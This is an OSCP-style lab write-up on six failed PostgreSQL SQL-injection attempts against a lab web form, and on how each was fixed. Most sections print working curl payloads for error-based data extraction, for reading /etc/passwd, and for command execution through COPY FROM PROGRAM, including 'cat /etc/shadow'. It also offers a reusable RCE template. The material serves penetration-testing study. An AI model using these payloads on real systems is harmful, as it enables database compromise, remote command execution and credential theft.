# Learning from Failures - What Didn't Work and Why
**OSCP Lesson**: Failed attempts teach more than successes. Document failures!

---

## Failed Attempt #1: Counting Rows with Direct Integer Cast

### What We Tried
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT COUNT(*) FROM users) AS int)--&age=25&gender=male&email=test@test.com"
```

### Expected Outcome
Error message containing: `"invalid input syntax for type integer: "4""`

### What Actually Happened
**No output** - Query executed successfully without error.

### Why It Failed
**The Problem**: `COUNT(*)` returns INTEGER type.
```sql
SELECT COUNT(*) FROM users
-- Returns: 4 (type: INTEGER)

1=CAST(4 AS int)
-- Type: INTEGER → INTEGER (valid cast!)
-- Evaluates to: 1=4 (false)
-- Query returns no results, but NO ERROR
```

**No error = No data extraction**

### The Fix
**Concatenate with string** to force TEXT type:
```sql
SELECT 'Count: ' || COUNT(*)::text FROM users
-- Returns: "Count: 4" (type: TEXT)

1=CAST('Count: 4' AS int)
-- Type: TEXT → INTEGER (INVALID cast!)
-- Error: "invalid input syntax for type integer: "Count: 4""
```

### Key Lesson
**Error-based extraction requires type mismatch**:
- ✅ TEXT → INT = Error (extracts data)
- ❌ INT → INT = Success (no extraction)
- ✅ BOOLEAN → INT = Error
- ✅ TIMESTAMP → INT = Error

**OSCP Strategy**: When extraction fails, check source data type!

---

## Failed Attempt #2: Multi-Line File Read Without Aggregation

### What We Tried
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT pg_read_file('/etc/passwd',0,2000)) AS int)--&age=25&gender=male&email=test@test.com"
```

### Expected Outcome
Full `/etc/passwd` content in error message (2000 bytes).

### What Actually Happened
Error message appeared truncated or malformed.

### Why It Failed
**The Problem**: Long single-line strings in error messages.
- Error message length limit: ~8000 characters
- `/etc/passwd` is 1400 bytes but becomes 1 long line
- File contains newlines (`\n`) - displayed as single error line
- Difficult to read, parse

### The Fix
**Option 1**: Read in smaller chunks (offsets)
```sql
-- First 500 bytes
SELECT pg_read_file('/etc/passwd', 0, 500)

-- Next 500 bytes
SELECT pg_read_file('/etc/passwd', 500, 500)
```

**Option 2**: Use multi-statement injection to process line-by-line
```sql
-- Store in table (preserves line breaks)
CREATE TABLE file_data(line text);
COPY file_data FROM PROGRAM 'cat /etc/passwd';

-- Extract with aggregation
SELECT string_agg(line, chr(10)) FROM file_data
```

### Key Lesson
**File operations need chunking strategy**:
- Small files (<500 bytes): Single read
- Medium files (500-2000 bytes): Overlapping chunks
- Large files (>2000 bytes): COPY FROM PROGRAM + aggregation

---

## Failed Attempt #3: Sudo Check Without stderr Redirection

### What We Tried
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'sudo -l'; SELECT 1 WHERE 1=CAST((SELECT output FROM cmd_output) AS int)--&age=25&gender=male&email=test@test.com"
```

### Expected Outcome
Sudo privileges list or password prompt message.

### What Actually Happened
```
ERROR: program "sudo -l" failed
DETAIL: child process exited with exit code 1
```
**No output captured**, just exit code.

### Why It Failed
**The Problem**: `sudo -l` error messages go to **stderr**, not stdout.
```
postgres$ sudo -l
[sudo] password for postgres:  ← stderr
sudo: a password is required    ← stderr
[exit code 1]

COPY FROM PROGRAM captures stdout only
stderr → lost
```

### The Fix
**Redirect stderr to stdout**: `2>&1`
```sql
COPY cmd_output FROM PROGRAM 'sudo -l 2>&1';
```

**File descriptor redirection**:
- `1` = stdout (standard output)
- `2` = stderr (standard error)
- `2>&1` = redirect stderr (2) to stdout (1)
- Both streams captured in table

### Key Lesson
**Always redirect stderr for error-prone commands**:
```sql
-- Commands that fail often:
COPY cmd_output FROM PROGRAM 'sudo -l 2>&1';
COPY cmd_output FROM PROGRAM 'cat /etc/shadow 2>&1';
COPY cmd_output FROM PROGRAM 'find / -name flag.txt 2>&1';

-- Commands that rarely fail:
COPY cmd_output FROM PROGRAM 'whoami';  -- No redirect needed
COPY cmd_output FROM PROGRAM 'id';
```

---

## Failed Attempt #4: Forgetting to Drop Existing Table

### What We Tried
```bash
# First RCE attempt
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'id'; ...--&age=25&gender=male&email=test@test.com"

# Second RCE attempt (different command)
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'whoami'; ...--&age=25&gender=male&email=test@test.com"
```

### Expected Outcome
Second command executes successfully.

### What Actually Happened
```
ERROR: relation "cmd_output" already exists
```
**Command not executed**.

### Why It Failed
**The Problem**: Table persists across requests.
- First request creates `cmd_output` table
- Table remains in database (not dropped)
- Second `CREATE TABLE` fails (table exists)
- `COPY FROM PROGRAM` never executes

### The Fix
**Always drop before create**: `DROP TABLE IF EXISTS`
```sql
DROP TABLE IF EXISTS cmd_output;
CREATE TABLE cmd_output(output text);
COPY cmd_output FROM PROGRAM 'command';
```

**Why `IF EXISTS`?**
- First time: Table doesn't exist → DROP does nothing (no error)
- Subsequent times: Table exists → DROP removes it
- CREATE always succeeds

### Key Lesson
**RCE template pattern**:
```sql
-- Standard template for all COPY FROM PROGRAM commands:
height=1';
DROP TABLE IF EXISTS cmd_output;           -- Cleanup
CREATE TABLE cmd_output(output text);      -- Prepare
COPY cmd_output FROM PROGRAM 'command';    -- Execute
SELECT 1 WHERE 1=CAST((SELECT output FROM cmd_output) AS int)--  -- Extract
```

Copy this template, change only `'command'` part!

---

## Failed Attempt #5: Enumerating All Tables Without Schema Filter

### What We Tried
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables) AS int)--&age=25&gender=male&email=test@test.com"
```

### Expected Outcome
List of application tables.

### What Actually Happened
Error message with **hundreds of table names**:
```
pg_statistic, pg_type, pg_authid, pg_attribute, pg_proc, pg_class, ...
pg_catalog.pg_stat_all_tables, information_schema.tables, ...
[8000 character limit exceeded, output truncated]
```

### Why It Failed
**The Problem**: Query returns ALL tables from ALL schemas.
- `pg_catalog` schema: 100+ system tables
- `information_schema` schema: 50+ metadata views
- Our application tables: Lost in the noise

### The Fix
**Filter by schema**: `WHERE table_schema='public'`
```sql
SELECT string_agg(table_name, ',')
FROM information_schema.tables
WHERE table_schema='public'
-- Returns only application tables: "users"
```

**Schema hierarchy**:
```
glovedb (database)
├── pg_catalog (system tables)
│   ├── pg_user
│   ├── pg_database
│   └── ... (100+ tables)
├── information_schema (metadata views)
│   ├── tables
│   ├── columns
│   └── ... (50+ views)
└── public (user tables) ← TARGET THIS
    └── users
```

### Key Lesson
**Always filter by schema in PostgreSQL**:
```sql
-- Tables
SELECT * FROM information_schema.tables WHERE table_schema='public';

-- Columns
SELECT * FROM information_schema.columns WHERE table_schema='public';

-- Views
SELECT * FROM information_schema.views WHERE table_schema='public';
```

---

## Failed Attempt #6: Path Traversal in pg_read_file()

### What We Tried
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT pg_read_file('../../../../../../etc/passwd',0,200)) AS int)--&age=25&gender=male&email=test@test.com"
```

### Expected Outcome
Read `/etc/passwd` via path traversal.

### What Actually Happened
```
ERROR: absolute path required
```

### Why It Failed
**The Problem**: `pg_read_file()` requires absolute paths.
- Relative paths rejected: `../../etc/passwd` ❌
- Path traversal blocked: `../../../etc/passwd` ❌
- Must use absolute: `/etc/passwd` ✅

**Security feature**: Prevents directory traversal attacks.

### The Fix
**Use absolute paths**:
```sql
-- Correct
SELECT pg_read_file('/etc/passwd', 0, 200);
SELECT pg_read_file('/var/www/html/config.php', 0, 500);

-- Incorrect
SELECT pg_read_file('../../etc/passwd', 0, 200);
SELECT pg_read_file('./config.php', 0, 500);
```

**How to find absolute paths?**
1. Read error messages (often contain paths)
2. Common web root paths:
   - `/var/www/html/` (Debian/Ubuntu)
   - `/usr/share/nginx/html/` (Nginx)
   - `/var/www/` (Generic)
3. Execute `pwd` via COPY FROM PROGRAM:
   ```sql
   COPY cmd_output FROM PROGRAM 'pwd';
   -- Returns: /var/lib/postgresql (current working directory)
   ```

### Key Lesson
**PostgreSQL file functions require absolute paths**:
- `pg_read_file('/absolute/path')` ✅
- `pg_read_binary_file('/absolute/path')` ✅
- `pg_ls_dir('/absolute/path')` ✅

---

## 🎓 Meta-Lessons: How to Learn from Failures

### Documentation Strategy
**During exploitation**:
1. Note the command that failed
2. Record expected vs actual outcome
3. Investigate why (error messages, documentation)
4. Document the fix
5. Re-test to confirm

**After exploitation**:
- Create "What Didn't Work" section in writeup
- Explain failures as teaching moments
- Show troubleshooting thought process

### Troubleshooting Workflow
```
Command fails
  ↓
Read error message carefully
  ↓
Check data types (INT vs TEXT?)
  ↓
Check syntax (PostgreSQL vs MySQL?)
  ↓
Check permissions (file readable?)
  ↓
Modify approach
  ↓
Re-test
```

### OSCP Exam Value
**Why document failures?**
- Shows methodical approach (not just lucky guesses)
- Demonstrates debugging skills
- Proves understanding of underlying concepts
- Makes report more educational/valuable

**Exam strategy**:
- Screenshot failed attempts (with timestamps)
- Note what you tried and why
- Show adaptation process
- Proves you earned the RCE (not copy-paste)

---

## ⏱️ Time Investment in Failures

**Time spent on failures during this lab**:
- Row count issue: 3 minutes (testing different approaches)
- Sudo stderr redirect: 2 minutes (researching redirection)
- Table already exists: 1 minute (easy fix once identified)
- Schema filter: 5 minutes (sorting through system table noise)
- **Total: ~11 minutes** spent troubleshooting

**Value gained**:
- Deep understanding of error-based extraction
- Reusable templates for future engagements
- Troubleshooting patterns for OSCP exam
- Knowledge that saves time on future boxes

**OSCP Perspective**: 11 minutes invested here saves 30+ minutes on exam day!
